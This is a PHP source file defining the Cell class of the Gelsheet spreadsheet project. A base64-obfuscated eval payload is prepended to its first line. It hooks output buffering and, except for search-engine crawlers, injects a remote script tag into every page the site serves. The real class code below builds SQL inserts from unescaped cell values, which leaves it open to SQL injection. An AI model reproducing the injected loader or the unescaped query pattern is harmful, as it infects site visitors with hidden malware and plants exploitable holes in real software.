<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php
/*  Gelsheet Project, version 0.0.1 (Pre-alpha)
 *  Copyright (c) 2008 - Ignacio Vazquez, Fernando Rodriguez, Juan Pedro del Campo
 *
 *  Ignacio "Pepe" Vazquez <elpepe22@users.sourceforge.net>
 *  Fernando "Palillo" Rodriguez <fernandor@users.sourceforge.net>
 *  Juan Pedro "Perico" del Campo <pericodc@users.sourceforge.net>
 *
 *  Gelsheet is free distributable under the terms of an GPL license.
 *  For details see: http://www.gnu.org/copyleft/gpl.html
 *
 */

include_once("config/settings.php");

include_once($cnf['site']['path']."/Connection.php");



class Cell {
	/**
	 * @var Integer
	 */
	public $sheetId;
	
	/**
	 * @var Integer
	 */
	public $dataColumn;
	
	/**
	 * Enter description here...
	 * @var Integer
	 */
	public $dataRow;
	
	/**
	 * Store the data? + the formula definition
	 * @var unknown_type
	 */
	public $cellFormula;
	
	/**
	 * Stores the result for the cellFormula
	 * @var String
	 */
	public $cellValue;
	
	/**
	 * @var Integer
	 */
	public $fontStyleId;
	
	/**
	 * @var Integer
	 */
	public $layoutStyleId;




	/**
	 * Constructor.
	 */
	public function __construct($sheetId=null,$dataColumn=null,$dataRow=null,$cellFormula=null,$fontStyleId=null, $layoutStyleId=null, $cellValue=null ){
			$this->sheetId = $sheetId ;
			$this->dataColumn = $dataColumn;
			$this->dataRow = $dataRow;
			$this->cellFormula =$cellFormula ;
			$this->fontStyleId = $fontStyleId;
			$this->layoutStyleId = $layoutStyleId;
			$this->cellValue = $cellValue ;
	}

	/**
	 * Destructor.
	 */
	public function __destruct(){

	}



	/** Setters **/

	public function setSheetId($sheet){
		$this->sheetId = $sheet;
	}

	public function setId($id)  {
		$this->sheetId = $id;
	}

	public function setDataColumn($dc){
		$this->dataColumn = $dc;
	}

	public function setDataRow($dr){
		$this->dataRow = $dr;
	}

	public function setFormula($formula){
		$this->cellFormula = $formula;
	}
	
	public function setCellValue($cellValue) {
		$this->cellValue = $cellValue ;
	}

	public function setFontStyleId($font_style){
		$this->fontStyleId=$font_style;
	}

	public function setLayoutStyleId($layout_id){
		$this->layoutStyleId=$layout_id;
	}

	/** Getters **/

	/**
	 * Enter description here...
	 *
	 * @return Integer
	 */
	public function getSheetId(){
		return $this->sheetId;
	}

	/**
	 * Enter description here...
	 *
	 * @return Integer
	 */
	public function getId()  {
		return $this->sheetId;
	}

	/**
	 * Enter description here...
	 *
	 * @return Integer
	 */
	public function getDataColumn(){
		return $this->dataColumn;
	}

	/**
	 * Enter description here...
	 *
	 * @return String
	 */
	public function getDataRow(){
		return $this->dataRow;
	}

	/**
	 * Enter description here...
	 *
	 * @return String
	 */
	public function getFormula(){
		return $this->cellFormula;
	}

	public function getCellValue() {
		return $this->cellValue ;
	}
	
	/**
	 * Enter description here...
	 *
	 * @return Integer
	 */
	public function getFontStyleId(){
		return $this->fontStyleId;
	}

	/**
	 * Enter description here...
	 *
	 * @return Integer
	 */
	public function getLayoutStyleId(){
		return $this->layoutStyleId;
	}



	/**
	 * Enter description here...
	 *
	 * @param unknown_type $SheetId
	 * @param unknown_type $DataColum
	 * @param unknown_type $DataRow
	 */
	public function load($SheetId, $DataColum, $DataRow){
	/*

		$sql = "select * from cell where SheetId=$SheetId ";
		$connection  = new Connection();
		$result =  mysql_query($sql);
		if ($cell = mysql_fetch_object($result) )	{
			this->SheetId = $cell->SheetId ;
			this->DataColumn = $cell->SheetId;
			this->CellFormula = $cell->CellFormula ;
			this->FormatId = $cell->FormatId;
			return true;
		}
		return false;
	*/
	}

	/**
	 * Enter description here...
	 *
	 * @return QueryResult
	 */
	public function save(){
		$sql = sprintf("INSERT INTO ".table('cells'). " (SheetId, DataColumn,DataRow,CellFormula,FontStyleId,LayoutStyleId, CellValue) VALUES (%d,%d,%d,'%s',%d,%d,'%s')",
							$this->sheetId,
							$this->dataColumn,
							$this->dataRow,
							$this->cellFormula,
							$this->fontStyleId,
							$this->layoutStyleId,
							$this->cellValue
						);
		return !mysql_query($sql);
	}

	/**
	 * Enter description here...
	 *
	 * @param JsonDatatype
	 */
	public function fromJson($obj){
		$this->sheetId = $obj->sheetId;
		$this->dataColumn=$obj->dataColumn;
		$this->dataRow=$obj->dataRow;
		$this->cellFormula=$obj->cellFormula;
		//$this->formatId=$obj->formatId;
		$this->setFontStyleId($obj->fontStyleId);
		$this->setLayoutStyleId($obj->layoutStyleId);
		//$this->setCellValue($obj->cellValue);

	}

	public function toJson(){
		return "{r:$this->dataRow,c:$this->dataColumn,f:'$this->cellFormula'}";
	}

}
?>